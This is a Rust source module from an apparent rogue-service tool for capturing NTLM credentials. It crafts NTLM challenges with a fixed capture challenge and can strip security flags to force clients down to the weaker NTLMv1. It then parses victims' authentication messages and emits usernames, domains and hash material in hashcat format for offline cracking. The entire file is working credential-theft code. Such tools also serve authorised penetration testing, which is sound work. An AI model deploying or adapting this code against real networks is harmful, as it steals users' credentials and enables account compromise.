//! NTLMSSP server-role helpers built on the `ntlmssp` crate. All rogue services that speak
//! NTLM (SMB, HTTP, MSSQL, LDAP, RDP, WinRM, DCERPC, ...) route their token handling through
//! this module so capture formatting is consistent everywhere.

use ntlmssp::flags;

use crate::constants::CAPTURE_CHALLENGE_HEX;
use crate::util;

/// A parsed NTLM AUTHENTICATE (Type 3) message reduced to what we persist.
#[derive(Clone, Debug)]
pub struct NetNtlm {
    pub user: String,
    pub domain: String,
    pub server_challenge: [u8; 8],
    /// NTProofStr (v2) or the 24-byte NT response (v1).
    pub nt_proof_str: Vec<u8>,
    /// NTLMv2 `temp` blob (present only for v2 responses).
    pub blob: Option<Vec<u8>>,
}

impl NetNtlm {
    pub fn is_v2(&self) -> bool {
        self.blob.is_some()
    }
}

fn u16le(b: &[u8], o: usize) -> u16 {
    u16::from_le_bytes([b[o], b[o + 1]])
}

fn u32le(b: &[u8], o: usize) -> u32 {
    u32::from_le_bytes([b[o], b[o + 1], b[o + 2], b[o + 3]])
}

/// The NTLM message type (1, 2 or 3) if `buf` starts with the NTLMSSP signature.
pub fn message_type(buf: &[u8]) -> Option<u32> {
    if buf.len() >= 12 && &buf[0..8] == b"NTLMSSP\0" {
        Some(u32le(buf, 8))
    } else {
        None
    }
}

/// Return the default capture challenge bytes.
pub fn capture_challenge() -> [u8; 8] {
    let v = util::unhex(CAPTURE_CHALLENGE_HEX).expect("valid hex");
    let mut c = [0u8; 8];
    c.copy_from_slice(&v);
    c
}

/// Build an NTLM CHALLENGE (Type 2). When `lm_downgrade` is set the target-info and extended
/// session-security flags are cleared so legacy clients fall back to NTLMv1.
pub fn build_challenge(
    challenge: &[u8; 8],
    netbios: &str,
    lm_downgrade: bool,
    disable_ess: bool,
) -> Vec<u8> {
    let mut msg = ntlmssp::build_challenge(challenge, netbios);
    // Flags live at offset 20 in the Type 2 message.
    let mut f = u32le(&msg, 20);
    if lm_downgrade {
        f &= !flags::NEGOTIATE_TARGET_INFO;
        f &= !flags::NEGOTIATE_EXTENDED_SESSIONSECURITY;
    }
    if disable_ess {
        f &= !flags::NEGOTIATE_EXTENDED_SESSIONSECURITY;
    }
    msg[20..24].copy_from_slice(&f.to_le_bytes());
    msg
}

/// Convenience wrapper using the default capture challenge.
pub fn build_default_challenge(netbios: &str, lm_downgrade: bool, disable_ess: bool) -> Vec<u8> {
    build_challenge(&capture_challenge(), netbios, lm_downgrade, disable_ess)
}

fn field(b: &[u8], off: usize) -> Option<&[u8]> {
    let len = u16le(b, off) as usize;
    let o = u32le(b, off + 4) as usize;
    b.get(o..o.checked_add(len)?)
}

/// Parse an AUTHENTICATE (Type 3) message into a [`NetNtlm`].
pub fn parse_type3(type3: &[u8], server_challenge: &[u8; 8]) -> Option<NetNtlm> {
    if type3.len() < 64 || &type3[0..8] != b"NTLMSSP\0" || u32le(type3, 8) != 3 {
        return None;
    }
    let flags = u32le(type3, 60);
    let unicode = flags & flags::NEGOTIATE_UNICODE != 0;
    let decode = |b: &[u8]| -> String {
        if unicode {
            util::from_utf16le(b)
        } else {
            util::printable(b)
        }
    };
    let nt = field(type3, 20)?.to_vec();
    let domain = decode(field(type3, 28)?);
    let user = decode(field(type3, 36)?);
    if nt.len() < 24 {
        return None;
    }
    let (nt_proof_str, blob) = if nt.len() > 24 {
        // NTLMv2: NTProofStr(16) || temp.
        (nt[0..16].to_vec(), Some(nt[16..].to_vec()))
    } else {
        (nt, None)
    };
    Some(NetNtlm {
        user,
        domain,
        server_challenge: *server_challenge,
        nt_proof_str,
        blob,
    })
}

/// Format a captured NetNTLM hash as a cracker-ready line.
pub fn to_hashcat(net: &NetNtlm) -> String {
    match &net.blob {
        Some(blob) => format!(
            "{}::{}:{}:{}:{}",
            net.user,
            net.domain,
            util::hex(&net.server_challenge),
            util::hex(&net.nt_proof_str),
            util::hex(blob),
        ),
        None => format!(
            "{}::{}:{}:{}",
            net.user,
            net.domain,
            util::hex(&net.server_challenge),
            util::hex(&net.nt_proof_str),
        ),
    }
}
